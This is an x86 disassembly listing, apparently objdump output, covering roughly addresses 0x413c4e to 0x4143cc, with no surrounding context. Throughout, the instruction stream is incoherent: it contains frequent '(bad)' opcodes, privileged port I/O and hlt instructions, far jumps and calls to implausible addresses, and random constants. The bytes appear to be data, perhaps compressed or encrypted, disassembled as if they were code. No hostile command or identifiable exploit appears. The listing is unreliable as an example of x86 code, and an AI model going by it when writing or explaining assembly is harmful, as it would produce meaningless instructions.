  413c4e:	push   esi
  413c4f:	or     BYTE PTR [ecx-0x2d6c235],al
  413c55:	sub    BYTE PTR [ebx-0x21],cl
  413c58:	inc    ebp
  413c59:	xchg   ebp,eax
  413c5a:	dec    eax
  413c5b:	bound  ecx,QWORD PTR [eax+0x588161b0]
  413c61:	pop    ebx
  413c62:	jno    0x413c23
  413c64:	repz inc ebx
  413c66:	or     edx,DWORD PTR [edi+0x651bd7f1]
  413c6c:	test   eax,0xdb95dd30
  413c71:	pop    esi
  413c72:	adc    eax,0x7b9536c9
  413c77:	jecxz  0x413c2a
  413c79:	data16 int 0xfa
  413c7c:	and    edx,DWORD PTR [ecx]
  413c7e:	dec    ecx
  413c7f:	dec    eax
  413c80:	add    eax,DWORD PTR [esi+eiz*2+0x501eb580]
  413c87:	and    eax,DWORD PTR [ebx+ebx*4+0x3]
  413c8b:	adc    esi,ebp
  413c8d:	jp     0x413c4d
  413c8f:	fnstenv [edx-0x46]
  413c92:	jmp    0x413c86
  413c94:	clc    
  413c95:	test   BYTE PTR [edi],cl
  413c97:	out    0xb4,eax
  413c99:	fcomp  QWORD PTR [edx]
  413c9b:	ss jmp 0xea94:0xb80a232a
  413ca3:	push   ecx
  413ca4:	arpl   bp,bp
  413ca6:	push   ds
  413ca7:	jae    0x413c32
  413ca9:	inc    esi
  413caa:	out    0x8c,al
  413cac:	mov    DWORD PTR [esi+0x5],esp
  413caf:	hlt    
  413cb0:	mov    ecx,0xa670ef6a
  413cb5:	in     eax,dx
  413cb6:	add    DWORD PTR [eax],edx
  413cb8:	int    0xb3
  413cba:	in     eax,dx
  413cbb:	nop
  413cbc:	dec    ebx
  413cbd:	fcomp  DWORD PTR [edx-0x52]
  413cc0:	lods   al,BYTE PTR ds:[esi]
  413cc1:	sahf   
  413cc2:	daa    
  413cc3:	dec    ecx
  413cc4:	loope  0x413c96
  413cc6:	and    ebx,ecx
  413cc8:	mov    dl,0x5e
  413cca:	dec    esp
  413ccb:	xor    eax,0x6c28c175
  413cd0:	and    ecx,DWORD PTR ds:0xc10c3640
  413cd6:	fsubr  QWORD PTR [edi]
  413cd8:	xchg   esp,ebp
  413cda:	push   esp
  413cdb:	ins    BYTE PTR es:[edi],dx
  413cdc:	scas   eax,DWORD PTR es:[edi]
  413cdd:	push   esi
  413cde:	xor    ecx,ebx
  413ce0:	not    DWORD PTR [edi-0x59]
  413ce3:	out    dx,eax
  413ce4:	mov    esp,0xab6d6474
  413ce9:	popa   
  413cea:	(bad)  
  413ceb:	hlt    
  413cec:	or     ch,ah
  413cee:	cmc    
  413cef:	add    al,0xc
  413cf1:	pop    ebx
  413cf2:	fisttp DWORD PTR [ecx]
  413cf4:	(bad)  
  413cf5:	and    al,0xc2
  413cf7:	out    dx,al
  413cf8:	dec    esp
  413cf9:	dec    ecx
  413cfa:	inc    edi
  413cfb:	lods   al,BYTE PTR ds:[esi]
  413cfc:	test   cl,bl
  413cfe:	or     DWORD PTR [ecx],edx
  413d00:	test   edx,ebp
  413d02:	jne    0x413d2b
  413d04:	push   ds
  413d05:	xchg   BYTE PTR [edi+0x50],dh
  413d08:	stos   DWORD PTR es:[edi],eax
  413d09:	inc    ecx
  413d0a:	les    eax,FWORD PTR [ebx+edi*8]
  413d0d:	fucom  st(7)
  413d0f:	xchg   edi,eax
  413d10:	ins    BYTE PTR es:[edi],dx
  413d11:	icebp  
  413d12:	cmp    eax,0xe76f7aee
  413d17:	pop    edi
  413d18:	push   esp
  413d19:	jge    0x413cf2
  413d1b:	xlat   BYTE PTR ds:[ebx]
  413d1c:	test   eax,0x63438dd5
  413d21:	test   BYTE PTR [edi+0x5951396c],bl
  413d27:	lds    esp,FWORD PTR [edi]
  413d29:	pop    edx
  413d2a:	adc    ebp,esp
  413d2c:	push   ecx
  413d2d:	dec    eax
  413d2e:	lock add eax,0x6db733f6
  413d34:	aam    0xd5
  413d36:	mov    dl,0x3b
  413d38:	out    dx,al
  413d39:	mov    edi,edi
  413d3b:	jge    0x413d30
  413d3d:	mov    al,0x1b
  413d3f:	sub    eax,0x7c7ee48
  413d44:	nop
  413d45:	cld    
  413d46:	push   edx
  413d47:	mov    eax,0xd0f6ce4f
  413d4c:	cmp    bl,BYTE PTR [edi-0x1fe7e707]
  413d52:	inc    ebx
  413d53:	xchg   DWORD PTR [ebx-0x303a6b45],eax
  413d59:	enter  0x6443,0x9e
  413d5d:	(bad)  
  413d5e:	jmp    0x413dc2
  413d60:	xor    DWORD PTR [ecx],0xfffffffb
  413d63:	call   0xd157c645
  413d68:	out    0x7d,al
  413d6a:	xor    eax,0x63795bd9
  413d6f:	dec    edi
  413d70:	adc    bl,BYTE PTR [edx+0x4]
  413d73:	in     eax,0x8e
  413d75:	es ins BYTE PTR es:[edi],dx
  413d77:	imul   ebp,eax,0x9518c2d2
  413d7d:	xor    ah,BYTE PTR ds:0xf0197062
  413d83:	lds    esi,FWORD PTR [esi+0x2]
  413d86:	outs   dx,BYTE PTR ds:[esi]
  413d87:	sub    bh,BYTE PTR [ebx+0x4a]
  413d8a:	jle    0x413d51
  413d8c:	pop    ss
  413d8d:	clc    
  413d8e:	push   ds
  413d8f:	adc    BYTE PTR [edx-0x14c955f0],dl
  413d95:	bnd jg 0x413dfe
  413d98:	jno    0x413d3f
  413d9a:	ja     0x413d9a
  413d9c:	ins    DWORD PTR es:[edi],dx
  413d9d:	(bad)  
  413d9e:	stos   BYTE PTR es:[edi],al
  413d9f:	pop    ecx
  413da0:	xor    al,al
  413da2:	pcmpeqw mm3,QWORD PTR [ebx+ecx*4]
  413da6:	mov    dl,0xb7
  413da8:	xlat   BYTE PTR ds:[ebx]
  413da9:	add    bh,BYTE PTR [eax+0x1b20c374]
  413daf:	clc    
  413db0:	inc    ecx
  413db1:	fdiv   st,st(5)
  413db3:	fmulp  st(7),st
  413db5:	test   DWORD PTR [ebx+edx*8],esi
  413db8:	adc    eax,0xad8e8e7f
  413dbd:	clc    
  413dbe:	push   0x1d
  413dc0:	cmp    DWORD PTR [eax+0x5410ba7e],ebp
  413dc6:	or     edx,DWORD PTR [edi]
  413dc8:	or     eax,DWORD PTR [ecx]
  413dca:	addr16 cdq 
  413dcc:	sbb    DWORD PTR [eax+edi*8+0x22],edx
  413dd0:	dec    ebp
  413dd1:	repz popa 
  413dd3:	es cli 
  413dd5:	repnz sbb DWORD PTR [ecx-0x598341e8],esi
  413ddc:	xchg   ecx,eax
  413ddd:	fdivr  DWORD PTR ds:0xb4a3a0e6
  413de3:	adc    DWORD PTR [edi-0x5d],ebx
  413de6:	cmp    esp,DWORD PTR ds:[edx]
  413de9:	fcmovnb st,st(7)
  413deb:	push   ebx
  413dec:	mov    bl,0x31
  413dee:	dec    edx
  413def:	xchg   ecx,eax
  413df0:	xchg   edx,eax
  413df1:	mov    eax,ds:0xaf3436a5
  413df6:	jae    0x413e58
  413df8:	outs   dx,DWORD PTR ds:[esi]
  413df9:	test   BYTE PTR ds:[eax+0x3],ch
  413dfd:	std    
  413dfe:	aad    0x50
  413e00:	or     ebp,DWORD PTR [ebp+esi*2-0x34]
  413e04:	cs je  0x413dae
  413e07:	(bad)  
  413e08:	lods   al,BYTE PTR ds:[esi]
  413e09:	mov    ds:0x3e37cfbf,al
  413e0e:	lahf   
  413e0f:	jg     0x413e75
  413e11:	push   ss
  413e12:	pop    ebp
  413e13:	mov    bh,0x13
  413e15:	ja     0x413e39
  413e17:	dec    edi
  413e18:	cmp    DWORD PTR [ebx-0x6c],esp
  413e1b:	or     al,0x45
  413e1d:	leave  
  413e1e:	jne    0x413dfb
  413e20:	ret    0x5638
  413e23:	imul   edx,DWORD PTR [ecx],0xffeed62e
  413e29:	sbb    al,0x94
  413e2b:	iret   
  413e2c:	mov    ecx,0x5ecaa72d
  413e31:	(bad)  
  413e32:	dec    DWORD PTR [ebp-0x7656b145]
  413e38:	push   0xfffffffb
  413e3a:	adc    dh,ah
  413e3c:	pusha  
  413e3d:	ret    0xddc9
  413e40:	mov    al,ds:0x82054b72
  413e45:	nop
  413e46:	sub    BYTE PTR [ebx-0x59ff013],ah
  413e4c:	mov    ds:0x2829d109,eax
  413e51:	inc    ecx
  413e52:	retf   
  413e53:	stos   DWORD PTR es:[edi],eax
  413e54:	inc    edi
  413e55:	mov    al,0x1b
  413e57:	dec    ecx
  413e58:	jmp    0x413e6c
  413e5a:	stos   BYTE PTR es:[edi],al
  413e5b:	mov    edi,0xdc5aa86d
  413e60:	les    eax,FWORD PTR [esi+0x2]
  413e63:	int    0xf1
  413e65:	mov    ecx,ss
  413e67:	fs aad 0xf4
  413e6a:	in     al,dx
  413e6b:	inc    ebp
  413e6c:	retf   
  413e6d:	sub    eax,0x23fa22df
  413e72:	fwait
  413e73:	mov    dl,0x3f
  413e75:	popf   
  413e76:	adc    DWORD PTR [ebx],ebp
  413e78:	add    al,0xb9
  413e7a:	push   0x1c
  413e7c:	and    al,0x7c
  413e7e:	rcl    BYTE PTR [ebp+esi*2+0x60],cl
  413e82:	les    edx,FWORD PTR [edx-0x56]
  413e85:	push   ss
  413e86:	pop    ebx
  413e87:	push   edx
  413e88:	fadd   st,st(6)
  413e8a:	(bad)  
  413e8c:	or     ebx,0x97336576
  413e92:	pop    ebp
  413e93:	mov    ebx,ebp
  413e95:	and    BYTE PTR [edi+0x11],dl
  413e98:	sahf   
  413e99:	xchg   ecx,eax
  413e9a:	push   0x17068678
  413e9f:	pop    ebx
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	fucomp st(3)
  413eb9:	pop    es
  413eba:	cmp    al,0xef
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	xor    DWORD PTR [edi+edx*2-0x3a],0x38
  413ec8:	pop    eax
  413ec9:	ficom  DWORD PTR [ebx]
  413ecb:	in     eax,0x1a
  413ecd:	and    DWORD PTR [eax],ecx
  413ecf:	fmul   st,st(6)
  413ed1:	shr    ah,0xd6
  413ed4:	fwait
  413ed5:	ja     0x413f51
  413ed7:	pop    edi
  413ed8:	jmp    0x49e6:0xa30b6a3a
  413edf:	adc    al,0x85
  413ee1:	mov    ch,0xca
  413ee3:	xchg   ecx,eax
  413ee4:	test   al,0x4b
  413ee6:	dec    ebx
  413ee7:	push   esi
  413ee8:	(bad)
  413eeb:	sbb    eax,0xba506cd3
  413ef0:	inc    ecx
  413ef1:	add    ah,ah
  413ef3:	fbstp  TBYTE PTR [ebx+0x580eefd2]
  413ef9:	sub    ecx,ecx
  413efb:	sub    al,bh
  413efd:	or     al,0xb
  413eff:	lods   eax,DWORD PTR ds:[esi]
  413f00:	stos   BYTE PTR es:[edi],al
  413f01:	and    eax,DWORD PTR [ebx-0x12]
  413f04:	aad    0x1f
  413f06:	rcl    edx,cl
  413f08:	sbb    DWORD PTR [eax+0x5],ebp
  413f0b:	mov    dl,0x4d
  413f0d:	mov    ds:0xa96569ee,eax
  413f12:	adc    eax,0xb890d0a6
  413f17:	cld    
  413f18:	pop    eax
  413f19:	or     al,0xfe
  413f1b:	aas    
  413f1c:	inc    ecx
  413f1d:	(bad)  
  413f1f:	cdq    
  413f20:	nop
  413f21:	mov    eax,ds:0x702f7aa9
  413f26:	jo     0x413eeb
  413f28:	push   esi
  413f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2a:	gs aad 0x97
  413f2d:	inc    ebp
  413f2e:	cdq    
  413f2f:	dec    ecx
  413f30:	in     al,dx
  413f31:	lea    eax,[ecx-0xd75673]
  413f37:	ret    
  413f38:	outs   dx,DWORD PTR ds:[esi]
  413f39:	enter  0xb05d,0xca
  413f3d:	dec    ecx
  413f3e:	outs   dx,BYTE PTR ds:[esi]
  413f3f:	data16 and al,ch
  413f42:	stos   DWORD PTR es:[edi],eax
  413f43:	lods   eax,DWORD PTR ds:[esi]
  413f44:	loop   0x413f66
  413f46:	xchg   BYTE PTR [edx],ch
  413f48:	jns    0x413ede
  413f4a:	fwait
  413f4b:	loopne 0x413fbc
  413f4d:	mov    dl,0x5e
  413f4f:	push   0x46377bfe
  413f54:	retf   
  413f55:	mov    al,ds:0x1082bbc7
  413f5a:	mov    ebx,ss
  413f5c:	adc    ecx,DWORD PTR [eax+0x11]
  413f5f:	dec    edi
  413f60:	cmp    dh,BYTE PTR [ebx-0x3d363247]
  413f66:	adc    esi,edi
  413f68:	je     0x413f84
  413f6a:	pop    es
  413f6b:	dec    esp
  413f6c:	aaa    
  413f6d:	fdivr  QWORD PTR [eax]
  413f6f:	(bad)  
  413f70:	sub    al,0x32
  413f72:	xor    ah,dl
  413f74:	hlt    
  413f75:	jg     0x413f7f
  413f77:	adc    BYTE PTR ds:0xc05b9f14,dh
  413f7d:	cmc    
  413f7e:	add    dh,BYTE PTR ds:0xe57fdc99
  413f84:	out    dx,eax
  413f85:	loopne 0x413f8d
  413f87:	pop    edx
  413f88:	mov    ch,0xf9
  413f8a:	sub    al,0xc
  413f8c:	push   esp
  413f8d:	test   eax,0x169a9828
  413f92:	or     BYTE PTR [edi],bh
  413f94:	loopne 0x413f25
  413f96:	test   ebx,ebx
  413f98:	mov    ebx,0x9eb811ad
  413f9d:	sub    ecx,eax
  413f9f:	loop   0x413f8a
  413fa1:	popf   
  413fa2:	inc    ebx
  413fa3:	mov    al,0x84
  413fa5:	test   BYTE PTR [eax],0x3c
  413fa8:	xchg   ebp,eax
  413fa9:	lahf   
  413faa:	add    eax,0x8d61f964
  413faf:	inc    esp
  413fb0:	xchg   ecx,eax
  413fb1:	je     0x413fba
  413fb3:	mov    BYTE PTR [edx-0x377d5bba],cl
  413fb9:	or     ah,0x92
  413fbc:	xor    DWORD PTR [esi],edx
  413fbe:	cmp    BYTE PTR [ecx*2+0x1c5a1504],ch
  413fc5:	add    esi,DWORD PTR [ecx+0x46]
  413fc8:	jbe    0x413fd6
  413fca:	in     al,0x59
  413fcc:	loop   0x413f77
  413fce:	popw   ss
  413fd0:	rcr    ebp,0xeb
  413fd3:	sbb    al,0x44
  413fd5:	pop    esi
  413fd6:	mov    eax,0xebeb5528
  413fdb:	or     DWORD PTR ds:0x793c08f7,0xb605c62a
  413fe5:	sub    BYTE PTR [eax],0x75
  413fe8:	mov    dh,0xe5
  413fea:	sbb    dh,dl
  413fec:	or     eax,0xf4b44e38
  413ff1:	sbb    eax,edi
  413ff3:	xchg   esi,eax
  413ff4:	xor    DWORD PTR [esi+ebp*2],0xffffffa1
  413ff8:	cdq    
  413ff9:	xchg   esi,eax
  413ffa:	lods   eax,DWORD PTR ds:[esi]
  413ffb:	aas    
  413ffc:	pop    edx
  413ffd:	jecxz  0x41406e
  413fff:	mov    ah,0xb3
  414001:	out    0x8c,al
  414003:	mov    DWORD PTR [eax+0x7d],edi
  414006:	pusha  
  414007:	ret    
  414008:	scas   al,BYTE PTR es:[edi]
  414009:	cmp    BYTE PTR [ebp+0x15d426cf],dl
  41400f:	hlt    
  414010:	inc    eax
  414011:	js     0x41405a
  414013:	cs in  al,0x4b
  414016:	xchg   edi,eax
  414017:	xor    al,0x5b
  414019:	dec    ecx
  41401a:	cdq    
  41401b:	or     eax,0x997ff3f
  414020:	hlt    
  414021:	fnstenv [edi-0x3a18d1d7]
  414027:	push   ebp
  414028:	xchg   edi,eax
  414029:	ss adc dl,0x44
  41402d:	xor    eax,0xb4e7544e
  414032:	sahf   
  414033:	outs   dx,BYTE PTR ds:[esi]
  414034:	in     eax,dx
  414035:	ss in  al,dx
  414037:	fsub   DWORD PTR [edx]
  414039:	test   al,0x52
  41403b:	popf   
  41403c:	int3   
  41403d:	in     al,0xcc
  41403f:	iret   
  414040:	inc    eax
  414041:	push   ss
  414042:	cmp    al,0x8a
  414044:	dec    edx
  414045:	xchg   edi,eax
  414046:	cdq    
  414047:	mov    ah,0x80
  414049:	(bad)  
  41404a:	sbb    eax,0xb95fcff9
  41404f:	xchg   BYTE PTR [esi-0x1d],bl
  414052:	das    
  414053:	mov    eax,0x9d0002b8
  414058:	sub    eax,DWORD PTR [ecx-0x7fe1f360]
  41405e:	pop    eax
  41405f:	sbb    BYTE PTR [edi],al
  414061:	mov    WORD PTR [ebp-0x18],?
  414064:	jg     0x414062
  414066:	add    DWORD PTR [edi-0x387b0d5e],esp
  41406c:	jecxz  0x414043
  41406e:	push   edi
  41406f:	inc    ebp
  414070:	fild   WORD PTR [ebx]
  414072:	stos   BYTE PTR es:[edi],al
  414073:	push   ss
  414074:	gs jne 0x413ffa
  414077:	ins    DWORD PTR es:[edi],dx
  414078:	sub    eax,0x9640eec7
  41407d:	xlat   BYTE PTR ds:[ebx]
  41407e:	shl    DWORD PTR [ebx+0x5f],cl
  414081:	fst    QWORD PTR [eax+edi*4+0x7e797173]
  414088:	imul   ecx,DWORD PTR [edi],0x62
  41408b:	push   ebp
  41408c:	dec    ebx
  41408d:	inc    eax
  41408e:	push   ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	xchg   esp,eax
  414091:	in     al,0x16
  414093:	cs pop ebx
  414095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414096:	push   esp
  414097:	outs   dx,BYTE PTR ds:[esi]
  414098:	sti    
  414099:	retf   
  41409a:	and    bl,ch
  41409c:	xchg   DWORD PTR [ebx-0x16],esi
  41409f:	lods   al,BYTE PTR ds:[esi]
  4140a0:	xchg   esi,eax
  4140a1:	ja     0x414083
  4140a3:	xor    BYTE PTR [esi+0x39],dh
  4140a6:	out    dx,al
  4140a7:	sub    edi,DWORD PTR [ebx+0x67]
  4140aa:	inc    ecx
  4140ab:	inc    edx
  4140ac:	mov    edi,0x81f0985c
  4140b1:	clc    
  4140b2:	pushf  
  4140b3:	mov    al,0xc2
  4140b5:	fist   DWORD PTR [edi+edi*8]
  4140b8:	ins    DWORD PTR es:[edi],dx
  4140b9:	and    BYTE PTR [ebx+ebx*1],al
  4140bc:	dec    edi
  4140bd:	mov    al,ds:0x6e53ed0
  4140c2:	xor    BYTE PTR [edi-0x16582b6a],ah
  4140c8:	adc    DWORD PTR [ebx+0x68],0xe955943
  4140cf:	shl    BYTE PTR [ecx+0x7a],1
  4140d2:	xor    eax,0x73bcbf4a
  4140d7:	xor    BYTE PTR [edx+0xf3493aa],0x56
  4140de:	jmp    0x8077037a
  4140e3:	add    bh,BYTE PTR [eax-0x1d]
  4140e6:	adc    al,0x66
  4140e8:	frstor [ebp*1-0x2dfe769]
  4140ef:	and    eax,0xcf6e92da
  4140f4:	rcr    DWORD PTR ds:0x791c05ce,cl
  4140fa:	pop    edx
  4140fb:	nop
  4140fc:	std    
  4140fd:	test   al,0x7a
  4140ff:	mov    edx,0xbb11764b
  414104:	(bad)  [edi+0x61ed7b7b]
  41410a:	out    dx,al
  41410b:	mov    bl,BYTE PTR [bp+0x1942]
  414110:	popa   
  414111:	and    eax,0x244649c7
  414116:	sbb    al,0x34
  414118:	outs   dx,BYTE PTR ds:[esi]
  414119:	fwait
  41411a:	xor    eax,0x18b5c8d1
  41411f:	mov    esi,ebx
  414121:	rcl    dh,0xc8
  414124:	ja     0x4140e5
  414126:	add    BYTE PTR [edx+edx*2],al
  414129:	or     ebp,0x33e4350f
  41412f:	fsubr  st,st(1)
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xa2145a14
  414142:	pushf  
  414143:	lods   al,BYTE PTR ds:[esi]
  414144:	mov    ds:0x787f0454,al
  414149:	in     eax,0x7e
  41414b:	js     0x4141c5
  41414d:	lods   al,BYTE PTR ds:[esi]
  41414e:	push   esp
  41414f:	icebp  
  414150:	xor    dh,BYTE PTR [esp+ecx*2-0x19355cd9]
  414157:	or     DWORD PTR [esi],0x5b
  41415a:	cld    
  41415b:	call   0x2df3fb3a
  414160:	sub    eax,0x57bbf99
  414165:	push   0xa2d9ed12
  41416a:	jge    0x414193
  41416c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41416d:	mov    eax,ds:0xdd5413f3
  414172:	(bad)  
  414173:	adc    dh,bh
  414175:	test   eax,0x9be3056f
  41417a:	loopne 0x4141f7
  41417c:	out    dx,al
  41417d:	or     bh,BYTE PTR ds:0x648298e0
  414183:	mov    al,ds:0xd8e4b6fc
  414188:	cmp    DWORD PTR [ebx],ecx
  41418a:	add    DWORD PTR cs:[esi],ebp
  41418d:	(bad)  
  41418e:	jg     0x414154
  414190:	pop    ss
  414191:	cmp    al,al
  414193:	cli    
  414194:	inc    eax
  414195:	je     0x414213
  414197:	std    
  414198:	cmp    eax,0x53f2d1ae
  41419d:	push   ebx
  41419e:	cmp    al,0x9d
  4141a0:	ins    DWORD PTR es:[edi],dx
  4141a1:	mov    cs,eax
  4141a3:	mov    al,ds:0x45c3ef6c
  4141a8:	jbe    0x41421d
  4141aa:	lock push ebp
  4141ac:	mov    esi,0xa3f44d1c
  4141b1:	(bad)  
  4141b2:	int    0x97
  4141b4:	jp     0x41417e
  4141b6:	mov    ebx,0xb9e6b4b7
  4141bb:	adc    BYTE PTR [ecx-0x42],dl
  4141be:	push   eax
  4141bf:	xchg   BYTE PTR [edi+ecx*4+0x5f43d62c],al
  4141c6:	mov    dh,0x97
  4141c8:	(bad)  [eax]
  4141ca:	out    dx,eax
  4141cb:	pop    ss
  4141cc:	push   ss
  4141cd:	mov    cl,0x6d
  4141cf:	inc    ecx
  4141d0:	jg     0x4141b3
  4141d2:	mov    cl,0xee
  4141d4:	lods   eax,DWORD PTR ds:[esi]
  4141d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141d6:	jg     0x4141a2
  4141d8:	int3   
  4141d9:	outs   dx,DWORD PTR ds:[esi]
  4141da:	mov    ecx,0x5a563cbf
  4141df:	add    ebx,DWORD PTR [eax]
  4141e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141e2:	xor    DWORD PTR [ecx-0x5c2cf52b],ebx
  4141e8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4141ea:	mov    dl,0xc7
  4141ec:	int3   
  4141ed:	jl     0x4141c1
  4141ef:	adc    DWORD PTR [ebx],edi
  4141f1:	add    ebx,DWORD PTR [ecx+0x5a]
  4141f4:	mov    al,ds:0xe3b25528
  4141f9:	popf   
  4141fa:	inc    ebp
  4141fb:	mov    esi,0x560bbfd5
  414200:	lock aas 
  414202:	and    BYTE PTR [ebx-0x1e],dh
  414205:	js     0x414224
  414207:	shl    DWORD PTR [edi],cl
  414209:	mov    bh,0xe1
  41420b:	ficomp DWORD PTR ds:0x2d5e3eb9
  414211:	inc    DWORD PTR [edi]
  414213:	in     al,dx
  414214:	es mov dh,0x1
  414217:	add    BYTE PTR [edx],dh
  414219:	xchg   esi,eax
  41421a:	and    al,0xed
  41421c:	pop    esi
  41421d:	dec    ecx
  41421e:	out    0x5,al
  414220:	lods   al,BYTE PTR ds:[esi]
  414221:	or     eax,0x14fc54e
  414226:	and    bl,BYTE PTR [esi-0x45]
  414229:	mov    esi,0x25f9baa6
  41422e:	and    BYTE PTR [ebx-0x7a],ch
  414231:	jl     0x41429b
  414233:	jo     0x4142ab
  414235:	shl    edx,0xa
  414238:	loop   0x414273
  41423a:	aas    
  41423b:	out    dx,eax
  41423c:	inc    esi
  41423d:	push   ebx
  41423e:	mov    dh,0x86
  414240:	xor    eax,0xbfbff980
  414245:	lahf   
  414246:	jb     0x414209
  414248:	jae    0x41421b
  41424a:	add    ecx,ebx
  41424c:	mov    eax,ds:0xf29b854c
  414251:	cs jae 0x414260
  414254:	push   0xffffffe0
  414256:	pop    edi
  414257:	push   ecx
  414258:	push   esi
  414259:	or     esp,DWORD PTR [ecx]
  41425b:	ja     0x41424b
  41425d:	les    ecx,FWORD PTR ds:0xd83445b1
  414263:	pop    ecx
  414264:	adc    al,0xf3
  414266:	hlt    
  414267:	jnp    0x4142e7
  414269:	adc    DWORD PTR [edx*8-0x5b181885],ecx
  414270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414271:	jmp    0x41422e
  414273:	out    0x25,eax
  414275:	xor    al,0xfe
  414277:	add    esp,esi
  414279:	adc    BYTE PTR [ecx],0x16
  41427c:	push   ds
  41427d:	dec    ecx
  41427e:	lock push edx
  414280:	adc    eax,0x41bcd3ba
  414285:	stos   BYTE PTR es:[edi],al
  414286:	inc    esp
  414287:	repz or eax,0xd1393d8
  41428d:	ja     0x4142ff
  41428f:	xor    esi,DWORD PTR [ecx]
  414291:	push   ds
  414292:	xor    eax,0x301e7e08
  414297:	test   al,0xb9
  414299:	xchg   BYTE PTR [eax+0x7a67e2c8],dl
  41429f:	cli    
  4142a0:	jl     0x4142ef
  4142a2:	or     BYTE PTR [ecx-0x6c],0x99
  4142a6:	sbb    ah,bl
  4142a8:	fiadd  DWORD PTR [eax+0x540ca051]
  4142ae:	adc    DWORD PTR [ebx+edx*8-0x54],edx
  4142b2:	test   DWORD PTR [ecx-0x2b],0xd4d14ff5
  4142b9:	call   0xca2993be
  4142be:	jns    0x414278
  4142c0:	test   DWORD PTR gs:[edx+edi*8],edi
  4142c4:	push   es
  4142c5:	push   esi
  4142c6:	ja     0x41432c
  4142c8:	sbb    eax,ebp
  4142ca:	(bad)  
  4142cb:	in     al,0x7e
  4142cd:	scas   eax,DWORD PTR es:[edi]
  4142ce:	imul   edi,DWORD PTR [esi-0x75],0x1b
  4142d2:	jp     0x414311
  4142d4:	pop    ecx
  4142d5:	out    0x88,al
  4142d7:	mov    edi,0x90c1daf1
  4142dc:	data16 xlat BYTE PTR ds:[ebx]
  4142de:	in     al,0xb4
  4142e0:	mov    eax,ebx
  4142e2:	jmp    0xe07c8a26
  4142e7:	pop    esp
  4142e8:	jb     0x414355
  4142ea:	out    dx,eax
  4142eb:	xchg   ebp,eax
  4142ec:	shl    BYTE PTR [edx+0x38c7a955],1
  4142f2:	add    bl,BYTE PTR [eax-0x55]
  4142f5:	sti    
  4142f6:	sbb    DWORD PTR [esi-0xb57227a],eax
  4142fc:	inc    ebp
  4142fd:	adc    dl,BYTE PTR [ecx]
  4142ff:	push   cs
  414300:	mov    dh,bh
  414302:	leave  
  414303:	loopne 0x4142fc
  414305:	ins    DWORD PTR es:[edi],dx
  414306:	cmp    ah,BYTE PTR [ebx-0x4b]
  414309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41430a:	repz loope 0x41436b
  41430d:	mov    esp,DWORD PTR [edx-0x3596679]
  414313:	and    eax,0xd4bc8a2f
  414318:	lods   al,BYTE PTR ds:[esi]
  414319:	adc    dh,dh
  41431b:	cmp    ecx,DWORD PTR [esi]
  41431d:	jo     0x4142c7
  41431f:	mov    ebx,DWORD PTR [edx+ecx*4]
  414322:	test   DWORD PTR [ecx+ebp*2+0x6d],ecx
  414326:	(bad)  
  414327:	daa    
  414328:	and    edx,edi
  41432a:	rol    dh,cl
  41432c:	aad    0xb3
  41432e:	inc    eax
  41432f:	pop    eax
  414330:	int    0x85
  414332:	test   al,0xc3
  414334:	rcr    edi,0x5f
  414337:	in     al,dx
  414338:	inc    ebx
  414339:	mov    esi,0x9010211f
  41433e:	jae    0x4142d0
  414340:	sub    bh,bl
  414342:	ja     0x41434e
  414344:	cmp    eax,0x2e0e2dab
  414349:	nop
  41434a:	or     eax,0x9ca5be95
  41434f:	(bad)  
  414350:	nop
  414351:	mov    dh,0x17
  414353:	jecxz  0x4142e4
  414355:	pop    eax
  414356:	fwait
  414357:	aaa    
  414358:	shl    ah,0x2b
  41435b:	ss jmpw 0xf18d
  414360:	pushf  
  414361:	jl     0x4143ca
  414363:	popa   
  414364:	xlat   BYTE PTR ds:[ebx]
  414365:	or     eax,0xdbbe7947
  41436a:	jnp    0x4143af
  41436c:	pop    ss
  41436d:	cmp    bl,BYTE PTR [edx+0x7f]
  414370:	outs   dx,BYTE PTR ds:[esi]
  414371:	(bad)  
  414373:	daa    
  414374:	loop   0x4143a3
  414376:	test   eax,0x3ebe3b82
  41437b:	mov    bh,0x53
  41437d:	stos   DWORD PTR es:[edi],eax
  41437e:	xchg   eax,eax
  414380:	push   esp
  414381:	int3   
  414382:	outs   dx,DWORD PTR ds:[esi]
  414383:	push   ebx
  414384:	retf   
  414385:	arpl   WORD PTR [edx],cx
  414387:	loopne 0x41436e
  414389:	dec    ecx
  41438a:	out    0xbf,eax
  41438c:	mov    ds:0xde1da0ee,al
  414391:	or     eax,0xcde98d6b
  414396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414397:	cmp    BYTE PTR [ebp+eax*8-0x108b962c],cl
  41439e:	jp     0x414376
  4143a0:	fcomp  DWORD PTR [ecx+edx*1]
  4143a3:	sub    BYTE PTR es:[edx+0x4c],bl
  4143a7:	push   edx
  4143a8:	push   ss
  4143a9:	out    0x8e,al
  4143ab:	out    dx,al
  4143ac:	scas   eax,DWORD PTR es:[edi]
  4143ad:	mov    bh,0x8c
  4143af:	out    0x5c,al
  4143b1:	loop   0x414334
  4143b3:	pop    esi
  4143b4:	pop    edx
  4143b5:	ins    BYTE PTR es:[edi],dx
  4143b6:	les    eax,FWORD PTR [edx+0x2b]
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
